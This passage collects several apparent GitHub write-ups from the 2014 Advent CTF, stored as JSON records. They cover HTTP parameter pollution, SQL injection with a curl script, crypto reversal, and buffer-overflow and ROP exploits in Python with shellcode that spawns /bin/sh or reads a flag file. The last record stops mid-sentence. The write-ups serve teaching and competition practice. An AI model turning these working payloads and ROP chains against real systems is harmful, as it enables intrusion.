00 00 00  |....dataJ.......|\n```\n\n***The flag is ADCTF_SOUNDS_GOOD***\n", "timestamp": "2025-10-24T11:40:09.936909"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/loginpage.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/loginpage.md", "content": "### Solved by historypeats\n\n>You can't guess LOGINPAGE_SECRET absolutely, it's not answer. So, maybe there are some vulnerability and you got an admin and flag.\n\n>I wrote this web app on Oct. 28 2014. Perl is awesome language and I love it :)\n\n>http://loginpage.adctf2014.katsudon.org/\n\nWriteUp:\n\nThis challenge required is to login as an \"admin\" user as well as have the give_me_flag bit set to True. The give_me_flag and isadmin values are stored in the user's cookie when they authenticate. So we need to find a way to manipulate this information for both isadmin and give_me_flag to be True so we get the Flag. \n\nThe first thing I noticed is that the user's credentials and admin rights are stored in a file with a semi-colon delimiter. So the format of user entries in the file looks like the following:\n\n```text\nusername:password:isadmin\n```\n\nThe easy way to exploit this is to create a user with the username with all the fields we want. For example, in the user registration page, our username field would be \"testuser:testpassword:1\" and the password field would be kept blank.\n\nThis successfully worked, and we can login as admin. However, the next condition we must meet in order to get the Flag is to have the give_me_flag value set to True in our cookie. I spent some time tinkering with this, including trying to find known vulnerabiilties with the Mojolicious framework and length-extension attacks (This obviously didn't work since there's an HMAC, but I thought I'd try anyway).\n\nNone of the options I attempted worked. However, I did stumble upon a cool blogpost (http://blog.gerv.net/2014/10/new-class-of-vulnerability-in-perl-web-applications/) on a \"new\" vulnerability surfacing in Perl web frameworks. Basically, using HTTP parameter pollution, you can override/create attributes in objects. In this case, we want to override both the isadmin and give_me_flag attributes to be True.\n\nSo in the end, we create a regular user, the login with the following tampered request:\n\n```text\nPOST /login HTTP/1.1\nHost: loginpage.adctf2014.katsudon.org\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nReferer: http://loginpage.adctf2014.katsudon.org/login\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 120\n\nname=hey&pass=dude&pass=1&pass=things&pass=give_me_flag&pass=give_me_flag&pass=money&pass=2&pass=3&pass=admin&pass=admin\n```\n\nAnd we are returned the following cookie in the response:\n\n```text\nHTTP/1.1 302 Found\nServer: nginx\nDate: Fri, 19 Dec 2014 19:01:18 GMT\nContent-Length: 0\nConnection: keep-alive\nSet-Cookie: mojolicious=eyJ1c2VyIjp7ImFkbWluIjoiZ2l2ZV9tZV9mbGFnIiwibW9uZXkiOiIyIiwiMyI6ImFkbWluIiwiZ2l2ZV9tZV9mbGFnIjoiZ2l2ZV9tZV9mbGFnIiwibmFtZSI6ImhleSIsIjAiOm51bGwsIjEiOiJ0aGluZ3MiLCJwYXNzIjoiZHVkZSJ9LCJleHBpcmVzIjoxNDE5MDE5Mjc4fQ----e6cecbe13fb30a8dd08b1caae74f6eb5ad4b09e1; expires=Fri, 19 Dec 2014 20:01:18 GMT; path=/; HttpOnly\nLocation: /\n```\n\nDecoding the cookie, we can see we've successfully poisoned the attributes:\n\n```text\n{\"user\":{\"admin\":\"give_me_flag\",\"money\":\"2\",\"3\":\"admin\",\"give_me_flag\":\"give_me_flag\",\"name\":\"hey\",\"0\":null,\"1\":\"things\",\"pass\":\"dude\"},\"expires\":1419019278}\n```\n\nThen we are redirected to index page and returned the Flag:\n\nADCTF_L0v3ry_p3rl_c0N73x7\n", "timestamp": "2025-10-24T11:40:10.010406"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/oh-my-scanf.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/oh-my-scanf.md", "content": "### Solved by barrebas, swappage, superkojiman\n\nAnother month, another CTF! This Advent CTF runs almost the entire month of December. This challenge seemed easy at first, but turned out to be a bit more tricky!\n\nWe're given a vulnerable binary plus the C source:\n\n```c\n/* gcc -m32 -fno-stack-protector -zexecstack -o oh_my_scanf oh_my_scanf.c */\n#include <stdio.h>\n\nint main(void) {\n    char name[16];\n\n    setvbuf(stdout, NULL, _IONBF, 0);\n    printf(\"name: \");\n    scanf(\"%s\", name);\n    printf(\"hi, %s\\n\", name);\n\n    return 0;\n}\n```\n\nThis looks pretty straight-forward, right? `scanf`, an executable stack and a small buffer, oh my! A standard buffer overflow:\n\n```bash\nbas@tritonal:~/adventctf$ ulimit -c unlimited\nbas@tritonal:~/adventctf$ ./oh_my_scanf \nname: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\nhi, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\nSegmentation fault (core dumped)\n```\n\nI checked `gdb` and `eip` was overwritten with `HHHH`, so we need 28 bytes to overflow the buffer. Next, because the stack is executable, we should be able to jump to it... but how? ALSR is enabled so we don't know the location of the stack. None of the registers contain a pointer to the shellcode, there aren't any `jmp esp` or `call esp` instructions. Bruteforcing it seemed tedious at best. We looked at writing a ROP chain, but there are very few useable gadgets. \n\nThinking long and hard together with Swappage and superkojiman, we came up with several strategies. One of the suggestions by Swappage revolved around abusing `scanf` to build shellcode somewhere. superkojiman noticed that the main code section is `rwx`!\n\n```\ngdb-peda$ vmmap\nStart      End        Perm  Name\n0x08048000 0x08049000 r-xp  /home/bas/adventctf/oh_my_scanf\n0x08049000 0x0804a000 r-xp  /home/bas/adventctf/oh_my_scanf\n0x0804a000 0x0804b000 rwxp  /home/bas/adventctf/oh_my_scanf\n0xf7e19000 0xf7e1a000 rwxp  mapped\n...snip...\n```\n\nYes, this has to be it! We can write to a section of memory that is executable *and* at a fixed location. After writing shellcode there, we simply jump to it to have our cake *and* eat it.\n\nSo I modified a ROP chain that I was fiddling with:\n\n```python\n#!/usr/bin/python\nimport struct\n\ndef p(x):\n  return struct.pack(\"<L\", x)\n\nSCANF = 0x80483b0a\nPOPRET = 0x804835d\nSCANF_STRING = 0x80495ce\n\npayload = \"\"\npayload += \"A\"*28\n\npayload += p(SCANF)         # return-to-got, scanf\npayload += p(POPRET)        # next return address\npayload += p(SCANF_STRING)  # pointer to \"%s\", arg1 for scanf\npayload += p(0x0804a040)    # pointer to readable/executable\n                            # arbitrarily chosen section of code\n                            # it doubles as return address\npayload += \"\\n\"             # close first scanf call\n\n# this modified shellcode below will be read by the scanf call that results from our ROP chain.\n# we need the extra \"\\na\" to flush the buffer, i think. \npayload += \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd\\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31\\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83\\xec\\x01\\x54\\x59\\x90\\xb2\\x01\\xcd\\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0\\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83\\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff\\xffflag\\na\"\n\nprint payload\n\n```\n\nI used a modified version of [this shellcode](http://www.shell-storm.org/shellcode/files/shellcode-73.php). The shellcode wasn't working locally, and I narrowed it down quickly to a bad byte, `0x0c`. This was part of the `lea ecx, [esp]` instruction. I exchanged this for:\n\n```bash\nbas@tritonal:~/adventctf$ rasm2 - \npush esp\n54\npop ecx\n59\nnop\n90\n```\n\nAnd off we went! I verified the exploit remotely by reading `/etc/passwd` and then I guessed the name of the flag file to be `flag`. Simple, really =)\n\n```bash\nbas@tritonal:~/adventctf$ python exploit.py | nc pwnable.katsudon.org 32100\nname: hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAA..].E.@..\nADCTF_Sc4NF_IS_PRe77Y_niCE\n```\n\nThe flag was `ADCTF_Sc4NF_IS_PRe77Y_niCE`. In the end, the executable stack turned out to be a red herring and something more unusual was going on. Cool challenge!\n\n", "timestamp": "2025-10-24T11:40:10.136592"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/otp.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/otp.md", "content": "### Solved by Swappage\n\notp was a nice (and painful) web challenge in the advent calendar CTF 2014.\n\nWe were provided with the source code of the web application and with an URL: the objective was to successfully login to the web site to get the flag.\n\n```perl\n#!/usr/bin/env perl\nuse Mojolicious::Lite;\nuse DBI;\n\nmy $dbh = DBI->connect(\n    'dbi:SQLite:dbname=./otp.db', '', '',\n    +{\n        RaiseError     => 1,\n        sqlite_unicode => 1,\n    }\n);\napp->helper(dbh => sub { $dbh });\n\nget '/' => sub {\n    my $c = shift;\n    my ($token, $pass) = gen_otp();\n    my $expire = time() + 10;\n    $c->dbh->do('INSERT INTO otp VALUES (?, ?, ?)', undef, $token, $pass, $expire);\n    $c->render('index', token => $token);\n};\n\npost '/' => sub {\n    my $c = shift;\n    my $token = $c->req->param('token');\n    # tiny firewall, but powerful :P\n    if ($token =~ /sqlite/i) {\n        $c->render('error', message => \"no hack.\");\n        return;\n    }\n    my $time = time();\n    my ($expire) = $c->dbh->selectrow_array(\n        \"SELECT ###CENSORED### FROM otp WHERE ###CENSORED### = '$token' AND ###CENSORED### < $time\",\n    );\n    if ($expire) {\n        $c->render('error', message => \"otp expired at $expire\");\n    } else {\n        my $pass = $c->req->param('pass');\n        my ($ok) = $c->dbh->selectrow_array(\n            'SELECT 1 FROM otp WHERE ###CENSORED### = ? AND ###CENSORED### = ?', undef, $token, $pass,\n        );\n        $c->render('auth', ok => $ok);\n    }\n    $c->dbh->do(\n        'DELETE FROM otp WHERE ###CENSORED### = ?', undef, $token\n    );\n};\n\nsub gen_otp {\n    open my $fh, '<:raw', '/dev/urandom' or die $!;\n    read $fh, my $token, 8;\n    $token = unpack 'H*', $token;\n    read $fh, my $pass, 16;\n    $pass = unpack 'H*', $pass;\n    return ($token, $pass);\n}\n\napp->start;\n__DATA__\n\n@@ index.html.ep\n% layout 'default';\n% title 'OTP';\n\n<form method=\"POST\">\n  <input type=\"hidden\" name=\"token\" value=\"<%= $token %>\" />\n  <input type=\"text\" name=\"pass\" />\n  <input type=\"submit\" value=\"auth\" />\n</form>\n\n@@ auth.html.ep\n% layout 'default';\n% title 'Authentication | OTP';\n\n% if ($ok) {\n<p>authentication succeeded.<br />the flag is: ###CENSORED###</p>\n% } else {\n<p>authentication failed.</p>\n% }\n\n@@ error.html.ep\n% layout 'default';\n% title 'Error | OTP';\n\n<p><%= $message %></p>\n\n@@ layouts/default.html.ep\n<!DOCTYPE html>\n<html>\n  <head>\n    <title><%= title %></title>\n  </head>\n  <style>\nbody, input {\n  color: #fff;\n  background: #333;\n  font-family: monospace;\n  font-size: 150%;\n}\n.container {\n  width: 100%;\n  margin-top: 50px;\n  text-align: center;\n}\n  </style>\n  <body>\n<div class=\"container\">\n<%= content %>\n</div>\n  </body>\n</html>\n\n```\n\nTo log in the web application we need to submit a password, paired with the token we are provided as an hidden field in the form, and this pair of credentials is valid for 10 seconds: if the token has expired we won't be able to log in, so what we need to do is to find a way to generate a token and exfiltrate the password generated by the application for that specific token, before it expires.\n\nAs it's possible to observe from the source code, the query at line 31 is dynamic, so it's possible to perform a SQL injection attack against the application.\n\nBy sending a tampered token value in the POST request, it's possible to notice that we are facing a union based injection attack: infact if we send something like this:\n\n    token=' UNION SELECT 1;\n\nwe would be presented with the following output in the web page\n\n```html\n    <p>otp expired at 1</p>\n```\n\nIt would at this point be easy to enumerate the database structure, tables and columns to exfiltrate some valid data, but it would have been too easy; at line 25 we can see\n\n```perl\n        if ($token =~ /sqlite/i) {\n        $c->render('error', message => \"no hack.\");\n        return;\n    }\n```\n\nwhich makes this challenge a real pain. Infact, as the comment suggets, this is a really tiny yet powerful firewall, because to enumerate the database, we'd need to access the sqlite_master table, where metadata about table structure are stored, but guess what? this is filtered and we cant.\n\nSo, no table enumeration: we need to find an alternative way to exfiltrate a valid password to log in.\n\nI'm not that good at sql injection attacks, and in fact it took me a while to figure this out, but after a lot of trial and error i learned that column names are not needed to read data from them\n\nI've tried the following injection query and eventually it resulted in the last generated password correctly exfiltrated.\n\n    token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);\n\n```html\n    <p>otp expired at 1bffa01d220d8d69f102dc08b07ba199</p>\n```\n\nnow all i needed was to be fast enaugh to exfiltrate a valid password and login within 10 seconds.\n\nbash and curl came to the rescue, i put togeder this dirty and terrible script that helped me to login and get the flag\n\n```bash\n    #!/bin/bash\n\n    TOKEN=$(curl http://otp.adctf2014.katsudon.org | grep input | grep token | awk -F '\"' '{print $6}')\n    PASS=$(curl http://otp.adctf2014.katsudon.org -d \"token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);&pass=\" | grep expired | awk -F ' ' '{print $4}' | awk -F '<' '{print $1}')\n\n    echo $TOKEN\n    echo $PASS\n\n    curl http://otp.adctf2014.katsudon.org -d \"token=$TOKEN&pass=$PASS\"\n```\n\n\n```html\n<p>authentication succeeded.<br />the flag is: ADCTF_all_Y0ur_5CH3ma_ar3_83L0N9_t0_u5</p>\n```\n", "timestamp": "2025-10-24T11:40:10.197526"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/paths.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/paths.md", "content": "### Solved by superkojiman\n\nThis is day 6 of the Advent CTF 2014 challenge. We're given a python script called paths.py with the following clue: \n\n> There are many paths, and search for shortest path from start to goal.\n> (to, cost)\n\nThe python script takes several arguments, of which needs to be the shortest path to get to the destination. Looking at paths.py we see that we get the flag if the sum of all the arguments passed to the script equal to 2014. As it turns out we can guess the shortest paths, and if it's incorrect, the script returns 1. \n\nIf we look at the script, we see that the first node is (96, 65), so let's try 96 as the first path: \n\n```\nkoji@ctf-team ~\n$ python paths.py 96\n\nkoji@ctf-team ~\n$ echo $?\n0\n```\n\n96 is the first correct path. Let's try (64, 99) next:\n\n```\nkoji@ctf-team ~\n$ python paths.py 96 64\n\nkoji@ctf-team ~\n$ echo $?\n1\n```\n\nNope, that didn't work. So let's try the next one, and the next, and the next, until we get a 0: \n\n```\nkoji@ctf-team ~\n$ python paths.py 96 94\n\nkoji@ctf-team ~\n$ echo $?\n0\n```\n\nSo the next one is 94. This will take forever to solve manually so let's use a scrip to do it for us: \n\n\n```bash\n#!/bin/bash\n# solveit.sh\n\ni=0\ntouch.txt\nwhile [[ $i -lt 150 ]]; do\n    python paths.py `cat t.txt` $i >/dev/null\n    if [[ $? -eq 0 ]]; then\n        grep -w $i t.txt > /dev/null 2>&1\n        if [[ $? -ne 0 ]]; then\n            echo \"+ next node: $i\"\n            echo -n \" $i\" >> t.txt\n            i=0\n            continue\n        fi\n    fi\n    i=$(($i + 1))\ndone\n```\n\nThis will write the correct paths to t.txt and pass the contents of t.txt to the next call to paths.py until we get the next correct path. At the end of it all, we should get the shortest path in t.txt\n\n```\nkoji@ctf-team ~\n$ ./solveit.sh \n+ next node: 96\n+ next node: 94\n+ next node: 72\n+ next node: 70\n+ next node: 69\n+ next node: 89\n+ next node: 18\n+ next node: 46\n+ next node: 22\n+ next node: 92\n+ next node: 79\n+ next node: 59\n+ next node: 74\n+ next node: 97\n+ next node: 58\n+ next node: 82\n+ next node: 35\n+ next node: 85\n+ next node: 30\n+ next node: 87\n+ next node: 25\n+ next node: 40\n+ next node: 41\n+ next node: 7\n+ next node: 99\n```\n\nThat's the shortest path. Let's get that flag now:\n\n```\nkoji@ctf-team ~\n$ python paths.py `cat t.txt`\nthe flag is: ADCTF_G0_go_5hOr7E57_PaTh\n```\n\nThe flag is **ADCTF_G0_go_5hOr7E57_PaTh**\n", "timestamp": "2025-10-24T11:40:10.292348"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/qr-garden.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/qr-garden.md", "content": "### Solved by Swappage\n\nWhy bother with programming skillz when you can get the same result with a couple of bash commands and memory greedy tools?\n\nQrgarden was the December 10th challenge in Advent CTF 2014: what we had to deal with was a huge image (8700 x 8700) filled with 10.000 87 x 87 qrcodes.\n\nThe objective was to determine which qrcode contained the flag, starting with \"ADCTF_\"\n\nInstead of looking forward for some python libraries to deal with image cropping and qrcode reading, i decided to pursue the dumb way: imagemagick already has everything you need to crop an image, and it was a matter of a simple command\n\n    convert qrgarden.png -crop 87x87 output/qrcode%03d.png\n\nto get 10.000 images, each containing a different qrcode\n\nto get the flag:\n\n```bash\n    for a in $(ls); do zbarimg $a | grep ADCTF_ >> ../flat.txt; done \n```\n\nand then\n\n    # cat ../flat.txt\n    QR-Code:ADCTF_re4d1n9_Qrc0de_15_FuN\n\nSorry for this terrible writeup.\nbut well, it's been a busy month, and i lack time for doing CTFs and enjoying things i'd love to do.\n\nSo, yeh.. hope you'll enjoy it no matter what :)\n", "timestamp": "2025-10-24T11:40:10.392952"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/rotate.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/rotate.md", "content": "### Solved by barrebas\n\nA crypto challenge! We're given a zip-file, containing `flag.jpg.enc` and `rotate.py`.\n\n`rotate.py` handles the encryption, but only does so one way:\n\n```python\nimport sys\nimport math\nimport struct\n\np = lambda x: struct.pack('f', x)\nu = lambda x: struct.unpack('b', x)[0]\n\nif len(sys.argv) != 3:\n    sys.exit(1)\n\nfilename = sys.argv[1]\nkey = math.radians(int(sys.argv[2]))\n\nbs = open(filename, 'rb').read()\nenc = open(filename + '.enc', 'wb')\n\nfor i in range(0, len(bs), 2):\n    x, y = u(bs[i]), u(bs[i+1])\n    enc.write(p(x * math.cos(key) - y * math.sin(key)) + p(x * math.sin(key) + y * math.cos(key)))\n```\n\nThe script takes two bytes at a time and transforms them into two floats via some goniometric functions, using a key. These floats are then dumped as DWORDS into the encrypted output file. Our first job is to determine what key was used. \n\nAssuming the flag really **is** a JPEG, we have some prior knowledge. Namely, the first two bytes are `0xff,0xd8`. I made a small file that contains only these two bytes and I ripped the first 8 bytes from `flag.jpg.enc`. I encoded the small 2-byte file with all possible keys and then compared the md5sum of each file to the md5sum of the 8-byte encoded file:\n\n```bash\nbas@tritonal:~/adventctf/rotate$ for i in `seq 0 360`; do python rotate.py ./header_real2 $i; mv header_real2.enc output$i; done\nbas@tritonal:~/adventctf/rotate$ md5sum header_encoded8\ned3f26885ebe2ba3ec0aa61215e4dcf2  header_encoded8\nbas@tritonal:~/adventctf/rotate$ md5sum output* |grep ed3f2\ned3f26885ebe2ba3ec0aa61215e4dcf2  output123\n```\n\nSo I now know the key that was used was `123`. I then started building a decoder. I hit a few snags on the way. It turns out that `rotate.py` doesn't use the literal value of each byte, but instead uses `struct.unpack('b', byte)` to generate a **signed** representation. That threw me off for a good while. \n\nThe decoder first builds a lookup table of each possible two-byte combination. Then, to decode, it reads eight bytes at a time and looks up the corresponding values from the lookup table. If there are no more floats to be read, it catches the error and outputs the decrypted data:\n\n```python\nimport sys\nimport math\nimport struct\n\np = lambda x: struct.pack('f', x)\nu = lambda x: struct.unpack('b', x)[0]\n\nif len(sys.argv) != 3:\n    sys.exit(1)\n\nfilename = sys.argv[1]\nkey = math.radians(int(sys.argv[2]))\n\nenc = open(filename, 'rb')\n\nlookup = {}\nfor k in xrange(256):\n    for l in xrange(256):\n        x = struct.unpack('b', chr(k))[0]\n        y = struct.unpack('b', chr(l))[0]\n        \n        x1 = p(x * math.cos(key) - y * math.sin(key))\n        x2 = p(x * math.sin(key) + y * math.cos(key))\n        \n        x3 = struct.unpack('<L', x1)[0]\n        x4 = struct.unpack('<L', x2)[0]\n        \n        lookup[ (x3<<32)+x4 ] = (k, l)\n        \ngoing = 1\ndecoded = \"\"\nwhile going:\n    try:\n        f1 = struct.unpack('<L', enc.read(4))[0]\n        f2 = struct.unpack('<L', enc.read(4))[0]\n        \n        (x, y) = lookup[ (f1<<32)+f2 ]\n        \n        decoded += chr(x)\n        decoded += chr(y)\n    except:\n        going = 0\n        print decoded\n```\n\nIt's *horrible* code, but it got the job done:\n\n![](/images/2014/advent/rotate-flag.jpg)\n\nThe flag was `ADCTF_TR0t4T3_f4C3`. \n\n", "timestamp": "2025-10-24T11:40:10.517746"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/shellcodeme.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/shellcodeme.md", "content": "### Solved by barrebas \n\nWhy o why do we take part in these painful exercises? Again, `shellcodeme` seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!\n\nWe're given a binary and the C source code:\n\n```c\n/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n\n#define SHELLCODE_LEN 1024\n\nint main(void) {\n    char *buf;\n    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n    read(0, &buf, SHELLCODE_LEN);\n    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~\n    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?\n}\n```\n\nThe bug was kind of obvious: \n\n```c\nread(0, &buf, SHELLCODE_LEN); // read to the location of buf itself\n```\n\nThe code will read in the shellcode at `&buf`, not `buf`. This will allow us to overwrite that pointer and take control of execution at this line of code:\n\n```c\n(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?\n```\n\nI chose to overwrite the `buf` pointer with `0x080484fc`, which is `leave; ret`. This will restore the stack and land us in my ROP chain. The basic idea is to re-use `mprotect` and `read` to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:\n\n```python\n#!/usr/bin/python\nimport struct\nimport socket\nimport telnetlib\nimport time\n \ndef p(x):\n        return struct.pack('<L', x)\n \nPOP3RET = 0x804855d\nMPROTECT = 0x8048330\nREAD = 0x8048340\n \npayload = \"\"\npayload += p(0x080484fc)        # leave; ret (restore stack)\npayload += \"A\"*12               # dummy \n \npayload += p(MPROTECT)          # mprotect shellcode area back to rwx\npayload += p(POP3RET)           # fix stack\npayload += p(0x20000000)        # addr of shellcode\npayload += p(0x1000)            # size (page-aligned)\npayload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE\n \npayload += p(READ)              # read in our shellcode\npayload += p(POP3RET)           # fix stack\npayload += p(0x0)               # stdin\npayload += p(0x20000000)        # address\npayload += p(1024)              # copied value\n \npayload += p(0x20000000)        # return to shellcode\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('pwnable.katsudon.org', 33201))\n \n# send first stage\ns.send(payload)\n \n# for some reason, this delay was necessary\ntime.sleep(0.05)\n \n# send shellcode, spawns /bin/sh\ns.send(\"\\x31\\xc9\\xf7\\xe9\\x51\\x04\\x0b\\xeb\\x08\\x5e\\x87\\xe6\\x99\\x87\\xdc\\xcd\\x80\\xe8\\xf3\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\")\n \nt = telnetlib.Telnet()\nt.sock = s\nt.interact()\n```\n\nI thought I was home-free! Let's cat that flag and be done with it! But what's this? (Yes, I've started using kali! =))\n\n```bash\nroot@kali:~# python exploit.py\nid\nuid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)\nls -alh\ntotal 36K\ndr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .\ndrwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..\n-rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout\n-rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc\n-rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile\n-r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag\n-r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2\ncat flag 2>&1\ncat: flag: Permission denied\n```\n\nGah! We need to exploit another binary! This one is the same C code, but compiled as x64 code... I transferred the binary over to my box and started poking it. \n\nThe basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:\n\n```bash\n   0x00000000004005f2 <+53>:    mov    edx,0x400\n   0x00000000004005f7 <+58>:    mov    rsi,rax\n   0x00000000004005fa <+61>:    mov    edi,0x0\n   0x00000000004005ff <+66>:    mov    eax,0x0\n   0x0000000000400604 <+71>:    call   0x400490 <read@plt>\n   0x0000000000400609 <+76>:    mov    edx,0x1\n   0x000000000040060e <+81>:    mov    esi,0x400\n   0x0000000000400613 <+86>:    mov    edi,0x20000000\n   0x0000000000400618 <+91>:    call   0x4004c0 <mprotect@plt>\n```\n\nI uploaded the binary to [ropshell.com](https://ropshell.com) and analyzed it to find the gadgets I'd need. I found `esi/rsi` and `edi/rdi` quickly, but `edx/rdx` was nowhere to be found. Finally, I located these two gadgets:\n\n```\n0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\n0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]\n```\n\nPrepare for some mind-bending ROP chains...\n\n```python\n#!/usr/bin/python\n\nimport struct\ndef p(x):\n    return struct.pack(\"L\", x)\n\npayload = \"\"\n\n'''\n   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\n   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]\n'''\n\n# first, fix up stack   \npayload += p(0x00400690)    # pop pop ret\npayload += p(0x0)\npayload += p(0x0)\n\n#### MPROTECT\n# gadgets to set edi, esi and edx and call mprotect\npayload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\npayload += p(0x6)           # rbx   << needs to be ebp-1 for code path!\npayload += p(0x7)           # rbp -> edx = mprotect.mask\npayload += p(0x00601038-6*8)    # r12 -> mprotect@got.plt\npayload += p(0x0)           # r13\npayload += p(0x400)         # r14 -> rsi -> esi = mprotect.len\npayload += p(0x20000000)    # r15 -> rdi -> edi = mprotect.addr\n\npayload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]\npayload += \"B\"*(200-144)    # spacer\n\n#### READ\n# gadgets to set edi, esi and edx and call read\n'''\n   0x00000000004005f2 <+53>:    mov    edx,0x400\n   0x00000000004005f7 <+58>:    mov    rsi,rax\n   0x00000000004005fa <+61>:    mov    edi,0x0\n   0x00000000004005ff <+66>:    mov    eax,0x0\n   0x0000000000400604 <+71>:    call   0x400490 <read@plt>\n'''\n# 0x601020 <read@got.plt>\npayload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\npayload += p(0x400-1)       # rbx   << needs to be ebp-1 for code path!\npayload += p(0x400)         # rbp -> edx = 0x400\npayload += p(0x601020-0x3ff*8)  # r12 -> read@got.plt\npayload += p(0x0)           # r13 \npayload += p(0x20000000)    # r14 -> rsi -> esi = read.addr\npayload += p(0x0)           # r15 -> rdi -> edi = 0?\n                            # lucky for me, rax = 0\npayload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]\npayload += \"B\"*(200-144)    # spacer\n\n# return to shellcode!\npayload += p(0x20000000)\n\nprint payload\n```\n\nOne of the tricky things with the mprotect and read ROP chains is the following. The code at `0x400671`, which I use to set `edx`, looks like this:\n\n```\n   0x400671 <__libc_csu_init+65>:   mov    edx,ebp\n   0x400673 <__libc_csu_init+67>:   mov    rsi,r14\n   0x400676 <__libc_csu_init+70>:   mov    edi,r15d\n   0x400679 <__libc_csu_init+73>:   call   QWORD PTR [r12+rbx*8]\n   0x40067d <__libc_csu_init+77>:   add    rbx,0x1\n   0x400681 <__libc_csu_init+81>:   cmp    rbx,rbp  \n   0x400684 <__libc_csu_init+84>:   jne    0x400670 <__libc_csu_init+64>\n   0x400686 <__libc_csu_init+86>:   add    rsp,0x8\n   0x40068a <__libc_csu_init+90>:   pop    rbx\n   0x40068b <__libc_csu_init+91>:   pop    rbp\n   0x40068c <__libc_csu_init+92>:   pop    r12\n   0x40068e <__libc_csu_init+94>:   pop    r13\n   0x400690 <__libc_csu_init+96>:   pop    r14\n   0x400692 <__libc_csu_init+98>:   pop    r15\n   0x400694 <__libc_csu_init+100>:  ret    \n```\n\nFirst `ebp` is copied to `edx`. Then `rsi` and `edi` are set. Then we call the QWORD pointer at a memory address referenced by `esi` and `ebx`. I chose to `esi` and `ebx` such that they point to the got pointer of mprotect. \n\nThe problem arises after returning from the mprotect call:\n\n```bash\n   0x40067d <__libc_csu_init+77>:   add    rbx,0x1\n   0x400681 <__libc_csu_init+81>:   cmp    rbx,rbp\n   0x400684 <__libc_csu_init+84>:   jne    0x400670 <__libc_csu_init+64>\n```\n\nSo I needed to make sure that `rbx` and `rbp` were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting `rbx` to `rbp-1`. Only thing left was to adjust `esi` and away we go! With the problem of setting `edx` out of the way, I could call mprotect to set `0x20000000` to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary. \n\nI sprinkled in some [shellcode 